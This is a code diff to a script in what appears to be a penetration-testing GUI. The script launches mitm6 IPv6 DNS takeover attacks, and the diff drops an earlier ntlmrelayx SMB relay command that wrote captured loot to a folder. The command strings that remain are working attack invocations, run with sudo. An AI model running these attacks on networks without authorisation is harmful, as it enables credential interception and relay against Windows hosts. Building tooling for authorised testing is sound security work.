@@ -6,27 +6,21 @@ import os
 from pollenisatorgui.core.components.apiclient import APIClient
 import psutil
 
+from pollenisatorgui.scripts.lan.utils import checkPath
+
 
 def main(apiclient, appli, **kwargs):
+    res, path = checkPath(["mitm6", "mitm6.py"])
+    if not res:
+        return False, path
     APIClient.setInstance(apiclient)
-    smb_signing_list = apiclient.find("computers", {"infos.signing":"False"}, True)
+    smb_signing_list = apiclient.find("computers", {}, True)
     export_dir = utils.getExportDir()
-    file_name = os.path.join(export_dir, "relay_list.lst")
     domains = set()
-    liste = []
-    with open(file_name, "w") as f:
-        for computer in smb_signing_list:
-            ip = computer.get("ip", "")
-            domain=computer.get("domain", "")
-            if domain.strip() != "":
-                domains.add(domain)
-
-            if ip != "":
-                liste.append(ip)
-                f.write(ip+"\n")
-    if len(liste) == 0:
-        return False, "No relayable host found yet"
-    # 
+    for computer in smb_signing_list:
+        domain = computer.get("domain", "")
+        if domain.strip() != "":
+            domains.add(domain)
     relaying_loot_path = os.path.join(export_dir, "loot_relay")
     try:
         os.makedirs(relaying_loot_path)
@@ -52,12 +46,6 @@ def main(apiclient, appli, **kwargs):
         domain = dialog.rvalue
     if domain is None:
         return False, "No domain choosen"
-
-    address = addrs[device][0].address
-    cmd = f"ntlmrelayx -tf {file_name} -6 -wh {address} -of {relaying_loot_path}/"
-    if os.geteuid() != 0:
-        cmd = "sudo "+cmd
-    appli.launch_in_terminal(kwargs.get("default_target",None), "ntlmrelayx for mitm6", f"{cmd}", use_pollex=False)
     cmd = f"mitm6 -i {device} -d {domain}"
     if os.geteuid() != 0:
         cmd = "sudo "+cmd
